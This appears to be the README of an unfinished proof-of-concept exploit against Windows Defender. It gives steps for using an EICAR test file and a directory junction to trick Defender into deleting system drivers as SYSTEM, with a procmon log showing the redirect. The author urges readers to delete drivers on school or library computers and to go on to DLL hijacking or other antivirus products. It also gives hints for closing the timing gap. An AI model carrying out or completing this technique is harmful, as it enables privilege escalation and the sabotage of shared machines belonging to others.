(This potentially works from a guest account, if you just want to gain arbitrary delete to bypass UAC, there are much easier ways!)

NOTE: THIS POC IS INCOMPLETE, THERE IS STILL A TIMING ISSUE TO BE FIXED

The purpose of this PoC is to gain arbitrary deletion rights as system (basically make windows defender delete whatever we want).
This would work from a guest account (meaning you could delete drivers on school/library computers! :D).

Furthermore, deleting arbitrary dlls can lead to hijacking issues, or files in windows\temp and programdata, which can then be recreated by the user to potentially hijack control flow of critical programs.


Current steps in the PoC:

1. Create a file called 3ware.sys (driver we are targeting) in a folder called eicar on the desktop. The content of our file is an EICAR test string.
2. Wait 5 seconds (obviously this part is what needs to be changed), delete our fake 3ware.sys file, and turn our folder into a junction to c:\windows\system32\drivers

In procmon (filter on 3ware.sys), you can clearly see that defender is unaware that the file has been deleted and its folder turned into a junction.
It begins checking the actual driver! (edit: I actually only spent a few hours on this bug, I didn't reverse anything, and I'm making untested assumptions here. If the deletion of our fake file triggers a different routine we may just never reach that delete at the end. But there is alot of potential for abuse here, using junctions, OPLOCKS, changing file permissions, etc ..  you can trigger some weird edge cases if you are creative enough ;) 

You should be able to delete the real driver, if you time the switch right before it tries to delete our fake file with eicar string.
The problem with switching too early is that it will read the real driver, and since its obviously not a virus, it won't try to delete it.

Normally you would use an OPLOCK to get the timing right, but since defender already places an OPLOCK on our file, we can't use that for timing. You need to figure out something else! (Just a tip, don't try to hit this window by just changing the Sleep() time, its to small and varies to much for this. You need something else :) )

Example output in procmon:


```
7:59:52.6718391 AM	MsMpEng.exe	2124	FileSystemControl	C:\Users\guest1\Desktop\eicar\3ware.sys	OPLOCK HANDLE CLOSED	Control: FSCTL_REQUEST_OPLOCK
7:59:52.6719846 AM	MsMpEng.exe	2124	CreateFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	Desired Access: Read Data/List Directory, Read Attributes, Synchronize, Disposition: Open, Options: Synchronous IO Non-Alert, Non-Directory File, Complete If Oplocked, Attributes: N, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: Opened
7:59:52.6720228 AM	MsMpEng.exe	2124	ReadFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	Offset: 0, Length: 68, Priority: Normal
7:59:52.6720763 AM	MsMpEng.exe	2124	CloseFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	
7:59:52.6720932 AM	MsMpEng.exe	2124	CloseFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	
7:59:56.1107248 AM	lpe.exe	6684	CreateFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	Desired Access: Read Attributes, Delete, Disposition: Open, Options: Non-Directory File, Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: Opened
7:59:56.1108337 AM	lpe.exe	6684	QueryAttributeTagFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	Attributes: A, ReparseTag: 0x0
7:59:56.1108719 AM	lpe.exe	6684	SetDispositionInformationFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	Delete: True
7:59:56.1108934 AM	lpe.exe	6684	CloseFile	C:\Users\guest1\Desktop\eicar\3ware.sys	SUCCESS	
7:59:56.1128859 AM	MsMpEng.exe	2124	CreateFile	C:\Windows\System32\drivers\3ware.sys	REPARSE	Desired Access: Read Attributes, Disposition: Open, Options: Open For Backup, Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: <unknown>
7:59:56.1130086 AM	MsMpEng.exe	2124	CreateFile	C:\Windows\System32\drivers\3WARE.SYS	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open For Backup, Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
7:59:56.1132937 AM	MsMpEng.exe	2124	CreateFile	C:\Windows\System32\drivers\3ware.sys	REPARSE	Desired Access: Read Attributes, Disposition: Open, Options: Open For Backup, Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a, OpenResult: <unknown>
7:59:56.1136595 AM	MsMpEng.exe	2124	CreateFile	C:\Windows\System32\drivers\3WARE.SYS	NAME NOT FOUND	Desired Access: Read Attributes, Disposition: Open, Options: Open For Backup, Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```

You can clearly see the switch to our real driver :) (I had already deleted 3ware.sys with another PoC, which is why it says not found, can't be bothered to set-up a clean vm!)



ps: Its all just fairly theoretical. It might not even work. But at the very least it will give you an idea on how to find similar bugs! Junctions used to be popular to bypass sandboxes, but it can also be a powerful tool for local privilege escalation!

pps: Oooh, and this is just windows defender.. imagine the possibilities with other AV software :) :) :) :) :)
